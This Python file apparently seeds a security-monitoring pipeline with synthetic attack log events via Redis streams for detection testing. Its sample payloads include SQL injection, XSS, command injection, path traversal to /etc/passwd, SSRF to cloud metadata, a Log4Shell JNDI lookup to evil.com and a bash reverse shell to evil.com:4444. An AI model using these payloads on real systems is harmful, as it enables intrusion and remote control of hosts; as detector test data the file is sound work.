import asyncio
import json
import uuid
import time
from datetime import datetime
from config.redis import get_redis
from config.settings import STREAMS

class SyntheticAttackInjector:
    ATTACKS = [
        {"stream": "logs", "desc": "SQLi via URL", "data": {
            "source_ip": "192.168.1.100",
            "method": "GET",
            "url": "/products?id=1'+OR+'1'='1'--",
            "path": "/products",
            "query": "id=1'+OR+'1'='1'--",
            "status": "200",
            "user_agent": "Mozilla/5.0",
        }},
        {"stream": "logs", "desc": "XSS in body", "data": {
            "source_ip": "10.0.0.55",
            "method": "POST",
            "url": "/search",
            "body": "q=<script>alert('xss')</script>",
            "status": "200",
            "user_agent": "Mozilla/5.0",
        }},
        {"stream": "logs", "desc": "Command injection", "data": {
            "source_ip": "10.0.0.55",
            "method": "GET",
            "url": "/ping?ip=127.0.0.1;id",
            "path": "/ping",
            "query": "ip=127.0.0.1;id",
            "status": "200",
        }},
        {"stream": "logs", "desc": "Path traversal", "data": {
            "source_ip": "10.0.0.55",
            "method": "GET",
            "url": "/static/../../../etc/passwd",
            "path": "/static/../../../etc/passwd",
            "status": "200",
        }},
        {"stream": "logs", "desc": "SSRF to metadata", "data": {
            "source_ip": "10.0.0.55",
            "method": "GET",
            "url": "/proxy?url=http://169.254.169.254/latest/meta-data/",
            "path": "/proxy",
            "query": "url=http://169.254.169.254/latest/meta-data/",
            "status": "200",
        }},
        {"stream": "logs", "desc": "Log4Shell", "data": {
            "source_ip": "10.0.0.55",
            "method": "GET",
            "url": "/",
            "user_agent": "${jndi:ldap://evil.com/a}",
            "status": "200",
        }},
        {"stream": "logs", "desc": "Brute force (10x 401s)", "data": [
            {"source_ip": "10.0.0.66", "method": "POST", "url": "/login", "body": "user=admin&pass=wrong{}", "status": "401"}
            for _ in range(12)
        ]},
        {"stream": "logs", "desc": "Dir busting (20x 404s)", "data": [
            {"source_ip": "10.0.0.77", "method": "GET", "url": f"/hidden{i}", "status": "404"}
            for i in range(25)
        ]},
        {"stream": "network", "desc": "SYN flood", "data": {
            "src_ip": "10.0.0.88",
            "dst_ip": "192.168.1.1",
            "dst_port": "80",
            "flags": "S",
            "protocol": "TCP",
            "length": "40",
        }},
        {"stream": "logs", "desc": "Reverse shell", "data": {
            "source_ip": "10.0.0.99",
            "method": "POST",
            "url": "/exec",
            "body": "cmd=bash -i >& /dev/tcp/evil.com/4444 0>&1",
            "status": "200",
        }},
    ]

    async def inject_all(self):
        r = await get_redis()
        count = 0
        for attack in self.ATTACKS:
            stream_key = STREAMS[attack["stream"]]
            datas = attack["data"]
            if isinstance(datas, list):
                for d in datas:
                    d["timestamp"] = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
                    await r.xadd(stream_key, d, maxlen=10000)
                    count += 1
                    await asyncio.sleep(0.01)
            else:
                datas["timestamp"] = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
                await r.xadd(stream_key, datas, maxlen=10000)
                count += 1
        await r.aclose()
        print(f"[synthetic] Injected {count} attack events across {len(self.ATTACKS)} scenarios")

synthetic = SyntheticAttackInjector()
